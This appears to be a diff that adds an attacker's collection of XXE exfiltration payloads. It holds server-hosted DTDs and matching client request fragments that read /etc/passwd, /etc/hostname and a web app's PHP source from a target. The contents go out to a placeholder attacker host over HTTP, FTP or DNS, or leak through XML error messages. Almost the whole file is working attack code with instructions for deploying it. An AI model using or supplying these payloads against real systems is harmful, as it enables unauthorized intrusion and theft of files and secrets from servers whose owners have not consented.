@@ -1,0 +1,50 @@
+# ============================================================
+#  XXE EXFIL SERVER-SIDE DTD  (host this file on YOUR-SERVER)
+#  These are the DTDs you serve. The matching CLIENT request
+#  fragments live in "XXE Blind & Bypass Payloads 2026.txt".
+#  Replace YOUR-SERVER / YOUR-DNS before using.
+# ============================================================
+
+# ---------- A. OOB HTTP EXFIL (http://YOUR-SERVER/exfil.dtd) ----------
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
+%all;
+
+# base64-preferred variant (php filter keeps output exfil-safe):
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?b64=%file;'>">
+%all;
+
+# ---------- B. OOB FTP EXFIL  (http://YOUR-SERVER/ftp.dtd) ----------
+# Best when http egress from the TARGET to the internet is filtered but ftp allowed (Java JAXP).
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR-SERVER:2121/%file;'>">
+%eval;
+%exfil;
+
+# ---------- C. OOB DNS EXFIL  (http://YOUR-SERVER/dns.dtd) ----------
+# Only works if the leaked file content is hostname-safe (rare) - subkeys for IPs.
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://%file;.dns.YOUR-DNS'>">
+%all;
+
+# ---------- D. ERROR-BASED EXTERNAL DTD  (http://YOUR-SERVER/error.dtd) ----------
+# Leaks target file straight into the target's own XML error message (no OOB needed).
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+# phishing/process wrapper (error read of a php source file via filter):
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+# ---------- HOW THE CLIENT PAIRS WITH THESE ----------
+# 1. Detection:   <!DOCTYPE data [ <!ENTITY % r SYSTEM "http://YOUR-SERVER/x"> %r; ]>
+# 2. Exfil:       <!DOCTYPE data [ <!ENTITY % file SYSTEM "file:///..."> 
+#                             <!ENTITY % remote SYSTEM "http://YOUR-SERVER/A.dtd">
+#                             %remote; ]>   <data>&send;</data>
+# 3. Error based: <!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://YOUR-SERVER/D.dtd"> %remote; ]>
+# Read the response error line / your server logs.
